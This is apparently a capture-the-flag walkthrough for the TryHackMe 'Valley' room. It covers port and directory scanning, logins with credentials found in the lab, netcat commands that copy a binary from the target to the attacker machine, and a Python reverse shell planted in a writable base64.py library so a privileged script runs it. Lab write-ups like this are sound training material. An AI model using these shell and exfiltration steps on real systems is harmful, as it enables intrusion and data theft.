# Valley

**Room Link:** [https://tryhackme.com/room/valleype](https://tryhackme.com/room/valleype)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>



### Scan all ports

ftp found on port 37370

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
gobuster dir --url http://$VICTIM/static -w /usr/share/dirb/wordlists/big.txt -l
```

<figure><img src="../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ffuf -u http://$VICTIM/static/FUZZ -w /usr/share/dirb/wordlists/big.txt
```

<figure><img src="../../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>







<figure><img src="../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>



```
Username: siemDev
Password: california
```

<figure><img src="../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>



### TCP/37370 - FTP

**Kali**

```
ftp $VICTIM 37370
Username: siemDev
Password: california
```



<figure><img src="../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>



### TCP/22 - SSH

**Kali**

```
ssh valleyDev@$VICTIM
Password: ph0t0s1234
```

<figure><img src="../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
```

<figure><img src="../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

## Lateral Movement

### Netcat

**Kali(receiving)**

```
nc -l -p 1234 > valleyAuthenticator
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < valleyAuthenticator
```



**Kali**

```
strings valleyAuthenticator > out.txt
```

<figure><img src="../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
Username: valley
Password: liberty123
```

<figure><img src="../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>



**Victim**

```
cat /photos/script/photosEncrypt.py
```

<figure><img src="../../.gitbook/assets/image (360).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
locate base64
ls -lah /usr/lib/python3.8/base64.py
groups
```

<figure><img src="../../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>

#### Python Reverse Shell

```
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$KALI",1337)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])
```

**Kali**

```
nc -lvnp 1337
```

<figure><img src="../../.gitbook/assets/image (362).png" alt=""><figcaption></figcaption></figure>









